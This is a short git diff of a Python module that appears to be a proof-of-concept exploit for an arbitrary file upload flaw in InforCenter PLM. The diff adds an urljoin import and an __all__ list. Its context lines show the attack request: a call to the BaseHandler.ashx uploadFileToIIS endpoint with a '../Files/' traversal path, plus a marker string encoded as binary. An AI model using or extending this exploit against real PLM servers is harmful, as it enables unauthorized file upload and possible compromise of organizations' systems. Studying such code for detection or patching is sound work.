@@ -8,6 +8,12 @@ InforCenter PLM是面向制造业产品全生命周期管理业务过程，旨�
 import os.path
 import sys
 from src import api, utils
+from urllib.parse import urljoin
+
+__all__ = [
+    "search",
+    "start"
+]
 
 
 def search(email, key):
@@ -24,7 +30,7 @@ def start(host, *args, **kwargs):
     :param kwargs:
     :return:
     """
-    url = f"{host}/Base/BaseHandler.ashx?type=uploadFileToIIS&uploadPath=../Files/"
+    url = urljoin(host, "/Base/BaseHandler.ashx?type=uploadFileToIIS&uploadPath=../Files/")
 
     input_str = "62CYP5GMbgee"
     binary_str = ' '.join(format(byte, '08b') for byte in input_str.encode('utf-8'))
